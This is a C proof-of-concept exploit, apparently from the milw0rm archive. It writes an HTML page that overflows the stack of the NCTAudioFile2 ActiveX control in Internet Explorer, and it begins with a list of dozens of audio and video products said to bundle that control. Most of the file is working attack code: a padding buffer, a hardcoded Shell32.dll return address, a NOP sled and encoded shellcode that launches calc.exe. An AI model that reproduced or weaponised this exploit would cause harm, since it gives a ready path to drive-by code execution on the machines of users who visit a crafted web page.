/*
-------------------------------------------------------------------------------------------------
[PoC] 79 Exes's / IE NCTAudioFile2.AudioFile ActiveX Remote Stack Overfl0w

Auther: InTeL
Original Advisory: http://secunia.com/secunia_research/
Attack Vector: EIP smash
Type: Remote (Malicious webpage)
Mail; intel@stole.in

Tested on Win2k SP4 (English), with Internet Explorer 6

    *Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7 but
     with XP Pro SP2 and IE 7 combo it seems to only result in a DoS, crashing IE,
     but when Ollydbg is attached to IExplorer and we go through the exploit process
     Calc.exe is executed (kinda confusing). So hopefully someone else will be able to get 
     RCE with it if you do though contact me and let me kno how you did it


List of Exes that come with NCTAudioFile2.AudioFile ActiveX component that are vulnerable

- NCTAudioStudio 2.7.1
- NCTAudioEditor 2.7.1
- NCTDialogicVoice 2.7.1 
- Magic Audio Recorder 5.3.7
- Magic Music Editor 5.2.2
- Magic Audio Converter 8.2.6 build 719
- Aurora Media Workshop 3.3.25
- DB Audio Mixer And Editor 1.1.0
- Fx Audio Editor 4.7.11
- Fx Audio Tools 7.3.4
- Fx Magic Music 5.7.7
- Fx New Sound 5.1.1
- Fx Movie Joiner 6.2.8
- Fx Movie Splitter 6.4.7
- Fx Movie Joiner and Splitter 6.2.8
- Fx Video Converter 7.51.21
- Fx Audio ConCat 1.2.0 Beta
- EXPStudio Audio Editor 4.0.2
- iMesh 7.0.2.26789
- Quikscribe Recorder version 5.021.29
- Quikscribe Player version 5.022.05
- SoundEdit Pro 2.1
- AudioConvert 3.1.0.125
- CDBurnerXP Pro 3.0.116
- Wave MP3 Editor 10.1
- aBasic Editor 10.1
- Movavi VideoMessage 1.0
- Movavi DVD to iPod 1.0
- Movavi ConvertMovie 4.4
- Movavi ChiliBurner 2.3
- Movavi SplitMovie 1.4
- Movavi Suite 3.5
- Dexster 3.0
- iVideoMAX 3.9
- VIDEOzilla 2.5
- Snosh 1.4
- MP3 to WAV Converter 3.0
- Sienzo Digital Music Mentor (DMM) 2.6.0.3
- MP3 Normalizer 1.03
- FREE Hi-Q Recorder 1.9
- Easy Hi-Q Recorder 2.0
- Easy Hi-Q Converter 1.7
- Audio Edit Magic 9.2.3 Build 389
- Video Converter Plus 3.01
- Audio Convertor Plus 2.2
- Virtual CD versions 6.0.0.7, 7.1.0.2, and 8.0.0.6
- Virtual CD File Server version 7.1.0.3
- Cheetah CD Burner 3.56
- Cheetah DVD Burner 1.79
- Power Audio Editor 11.0.1
- AudioEdit Deluxe 4.10
- Blaze Media Pro 7.0
- Blaze MediaConvert 3.4
- ContextConvert Pro 3.1
- Full Audio Converter 4.2
- Music Editing Master 5.2
- Easy Audio Editor 7.4
- Visual Video Converter 4.4
- Text to Speech Maker 1.3.8
- Arial Sound Recorder 1.4.3
- Arial Audio Converter 2.3.40
- Absolute Sound Recorder 3.4.5
- Absolute Video to Audio Converter 2.7.9
- Absolute MP3 Splitter 2.5.4
- McFunSoft iPod Audio Studio 6.2.4
- McFunSoft Recording to iPod Solution 5.1
- McFunSoft iPod Music Converter 5.1
- McFunSoft Audio Recorder for Free 6.1
- McFunSoft Audio Editor 6.3.3 Build 489
- McFunSoft Audio Studio 6.6.3 Build 479
- Easy Ringtone Maker 2.0.5
- RecordNRip 1.0
- MP3 WAV Converter 3.1.8
- Audio Editor Gold 9.2.5 Build 424
- Audio Studio Gold 7.0.1.1 Build 500
- Altdo Mp3 Record&Edit Audio Master 1.2
- Altdo Convert Mp3 Master 1.1
- Magic Audio Editor Pro 10.3.1 Build 476
- Magic Music Studio Pro 7.0.2.1 Build 500
- + prob many more
------------------------------------------------------------------------------------------------- 
*/

#include <stdlib.h>
#include <stdio.h>

// Exec Calc.exe Scode
unsigned char scode[] =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x37\x6a\x4a"
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x5a\x42\x32\x42\x41\x32"
"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x7a\x49\x59\x6c\x6d"
"\x38\x31\x54\x37\x70\x65\x50\x55\x50\x4c\x4b\x47\x35\x35\x6c\x4c"
"\x4b\x51\x6c\x43\x35\x52\x58\x73\x31\x6a\x4f\x4c\x4b\x42\x6f\x55"
"\x48\x6e\x6b\x61\x4f\x51\x30\x54\x41\x7a\x4b\x73\x79\x4c\x4b\x55"
"\x64\x4e\x6b\x77\x71\x5a\x4e\x34\x71\x69\x50\x4c\x59\x6e\x4c\x4b"
"\x34\x6f\x30\x34\x34\x56\x67\x6a\x61\x6a\x6a\x46\x6d\x64\x41\x4f"
"\x32\x5a\x4b\x6c\x34\x55\x6b\x31\x44\x34\x64\x46\x64\x30\x75\x4b"
"\x55\x4e\x6b\x61\x4f\x45\x74\x45\x51\x7a\x4b\x70\x66\x6e\x6b\x76"
"\x6c\x62\x6b\x4e\x6b\x53\x6f\x35\x4c\x75\x51\x6a\x4b\x4e\x6b\x65"
"\x4c\x6e\x6b\x56\x61\x58\x6b\x6b\x39\x51\x4c\x44\x64\x63\x34\x69"
"\x53\x37\x41\x49\x50\x75\x34\x6e\x6b\x51\x50\x44\x70\x6b\x35\x59"
"\x50\x72\x58\x64\x4c\x4e\x6b\x61\x50\x66\x6c\x4e\x6b\x50\x70\x45"
"\x4c\x6e\x4d\x4c\x4b\x43\x58\x77\x78\x6a\x4b\x45\x59\x6c\x4b\x6d"
"\x50\x4c\x70\x53\x30\x53\x30\x75\x50\x4c\x4b\x33\x58\x45\x6c\x63"
"\x6f\x66\x51\x48\x76\x75\x30\x51\x46\x6c\x49\x4c\x38\x6e\x63\x4f"
"\x30\x61\x6b\x52\x70\x62\x48\x58\x6f\x78\x4e\x6d\x30\x75\x30\x62"
"\x48\x4e\x78\x69\x6e\x4e\x6a\x44\x4e\x70\x57\x6b\x4f\x4b\x57\x55"
"\x33\x72\x41\x50\x6c\x30\x63\x46\x4e\x43\x55\x54\x38\x65\x35\x43"
"\x30\x4a";

int main(int argc, char *argv[])
{
    FILE *handle;

    if(argc < 2) {
        printf("[PoC] 79 EXE's / IE NCTAudioFile2.AudioFile ActiveX Remote Buffer Overflow\n");
        printf("Usage: %s <output html file>  \n", argv[1]);
        return 0;
    }

    if(!(handle = fopen(argv[1], "w"))) {
        printf("[+] Error");
        return 0;
    }
    
    fputs("<html>\n<head>\n",handle);
    fputs("<title> PoC 79 Exe's / IE NCTAudioFile2.AudioFile ActiveX Remote Stack Overfl0w By InTeL </title>\n", handle);
    fputs("</head>\n\n", handle);

    fputs("<body>\n",handle);
    fputs("<object classid=\"clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC\" id=\"pwnage\">\n",handle);
    fputs("</object>\n<script>\n\n", handle);

    fputs("pwnage.SetFormatLikeSample(\"", handle);
    for (int i=0;i<4120;i++) {
        fputs("A", handle);
    }
    fputs("\x5e\xca\xff\x7c", handle);  //0x7cffca5e in Shell32.dll - Win2k
    for (i=0;i<200;i++) {
        fputs("\x90", handle);
    }
    fputs((char *)scode, handle);
    fputs("\")\n\n", handle);

    fputs("</script>\n</html>\n</body>\n", handle);
    fclose(handle);

    printf("[+] File successfully created");

    return 0;
}

// milw0rm.com [2007-04-13]
